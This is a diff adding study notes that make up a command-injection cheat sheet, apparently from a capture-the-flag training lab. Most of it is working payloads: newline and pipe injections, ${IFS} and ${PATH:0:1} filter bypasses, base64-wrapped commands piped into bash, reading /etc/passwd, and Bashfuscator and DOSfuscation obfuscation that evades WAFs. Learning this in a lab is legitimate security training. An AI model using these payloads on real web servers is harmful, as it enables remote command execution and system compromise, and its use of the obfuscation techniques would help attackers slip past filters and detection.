@@ -1,0 +1,183 @@
+This is among the most critical types of vulnerabilities. It allows us to execute system commands directly on the back-end hosting server, which could lead to compromising the entire network. If a web application uses user-controlled input to execute a system command on the back-end server to retrieve and return specific output, we may be able to inject a malicious payload to subvert the intended command and execute commands.
+=========================================================================
+                =============
+                || payloads||
+                =============
+
+=> ping -c 1 127.0.0.1 || whoami
+
+=> ping -c 1 127.0.0.1 && whoami
+
+=> ip=127.0.0.1+%7cwhoami
+
+=> ip=1.1.1.1%0a${IFS}{ls,-la} ---> list all direcotories bypassing MF w4f!
+
+=> ip=1.1.1.1%0a${IFS}{ls,${PATH:0:1}home} ---> find name of the user in the '/home' folder
+
+=> ip=1.1.1.1%0a${IFS}{ls,la,${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt} ---> list all files in specific directory
+
+=> ip=1.1.1.1%0a${IFS}{c$@at,${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt} ---> character insertion bypassplus path bypass
+
+=> find /usr/share/ | grep root | grep mysql | tail -n 1 ---> find the output of this command
+=> base64 encoded also with parameters encoded ---> %0abas$@h<<<$(ba$@se6$@4${IFS}-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDEK)
+=========================================================================
+              ========================
+              || skills assessment  ||
+              ========================
+
+=> %0ab[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
+
+=> iex"$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
+
+=> current location: /var/www/html/files/
+
+=> http://{ip:port}/index.php?to=&from=51459716.txt
+
+=> test this---> base64 -> ${PATH:0:1}flag.txt
+
+=> echo -n 'mv ${PATH:0:1}flag.txt ${PATH:0:1}var${PATH:0:1}www${PATH:0:1}html${PATH:0:1}files${PATH:0:1}tmp' | base64
+
+=> echo -n 'cat ${PATH:0:1}flag.txt' | base64
+
+=> %7c%7cbash<<<$(base64%09-d<<<bXYgJHtQQVRIOjA6MX1mbGFnLnR4dCAke1BBVEg6MDoxfXZhciR7UEFUSDowOjF9d3d3JHtQQVRIOjA6MX1odG1sJHtQQVRIOjA6MX1maWxlcyR7UEFUSDowOjF9dG1w)
+
+=> print flag ---> %7c%7cbash<<<$(base64%09-d<<<Y2F0ICR7UEFUSDowOjF9ZmxhZy50eHQ=)
+
+====================================================================================
+             ======================================   
+             ||Command Injection Methods ENCODED:||
+             ======================================
+
+__________________________________
+|Semicolon 	;	%3b      |
+|New Line	\n	%0a      |
+|Background	&	%26      |
+|Pipe	        |	%7c      |
+|AND	        &&	%26%26   |
+|OR	        ||	%7c%7c   |
+|Sub-Shell	``	%60%60   |
+|Sub-Shell	$()	%24%28%29|
+|________________________________|
+
+====================================================================================
+
+ Operators can be used for various injection types, like SQL injections, LDAP injections, XSS, SSRF, XML, etc. 
+
+___________________________________________________________________________________
+|    Injection Type                   |                      Operators             |
+|_____________________________________|____________________________________________|
+|     SQL Injection	                       ' , ; -- /* */                      |
+|     Command Injection	                       ; &&                                |
+|     LDAP Injection	                       * ( ) & |                           |
+|     XPath Injection	                       ' or and not substring concat count |                  
+|     OS Command Injection	               ; & |                               |
+|     Code Injection	                       ' ; -- /* */ $() ${} #{} %{} ^      |             
+|     Directory Traversal/File Path Traversal  ../ ..\\ %00                        |
+|     Object Injection	                       ; & |                               |
+|     XQuery Injection	                       ' ; -- /* */                        |
+|     Shellcode Injection	               \x \u %u %n                         |
+|     Header Injection	                       \n \r\n \t %0d %0a %09              |
+|__________________________________________________________________________________|     
+
+
+=========================================================================================================
+||Filter/WAF Detection||
+========================
+
+Other than the IP (which we know is not blacklisted), we sent:
+- A semi-colon character ;
+- A space character
+- A whoami command
+
+{ls,-la}
+${IFS}
+127.0.0.1%0a whoami
+127.0.0.1%0a{ls,-la}
+______________________________________________________________________________________________________
+________________________________________
+|Bypassing Other Blacklisted Characters|
+----------------------------------------
+_______
+|LINUX|
+-------
+echo ${PATH}
+echo ${PATH:0:1}
+echo ${LS_COLORS:10:1}
+ip=127.0.0.1${LS_COLORS:10:1}${IFS}
+
+_________
+|WINDOWS|
+---------
+echo %HOMEPATH:~6,-11%
+____________
+POWERSHELL
+------------
+$env:HOMEPATH[0]
+$env:PROGRAMFILES[10]
+
+man ascii     # \ is on 92, before it is [ on 91
+echo $(tr '!-}' '"-~'<<<[)
+______________________________
+|Commands Blacklist|
+------------------------------
+windows & linux
+w'h'o'am'i
+w"h"o"am"i
+----------
+Linux Only
+who$@ami
+----------
+Windows Only
+who^ami
+
+=====================================================
+| ADVANCED COMMAND OBFUSCATION |
+================================
+FROM BASH: (COMMANDS)
+
+$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+
+$(a="WhOaMi";printf %s "${a,,}")
+
+echo 'whoami' | rev
+
+$(rev<<<'imaohw')
+
+"whoami"[-1..-20] -join ''
+
+iex "$('imaohw'[-1..-20] -join '')"
+
+echo -n 'cat /etc/passwd | grep 33' | base64
+
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+
+echo -n whoami | iconv -f utf-8 -t utf-16le | base64
+_____________________________________________
+POWERSHELL
+
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
+
+================================================
+||| EVASION TOOLS |||
+=====================
+https://github.com/Bashfuscator/Bashfuscator
+
+MINI TUTORIAL & PAYLOADS:
+
+
+./bashfuscator -c 'cat /etc/passwd'
+./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
+bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'
+___________________________________
+||Windows (DOSfuscation)||
+--------------------------
+
+SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
+encoding
+1
+typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
+======================================================================================================
+
+
+
+
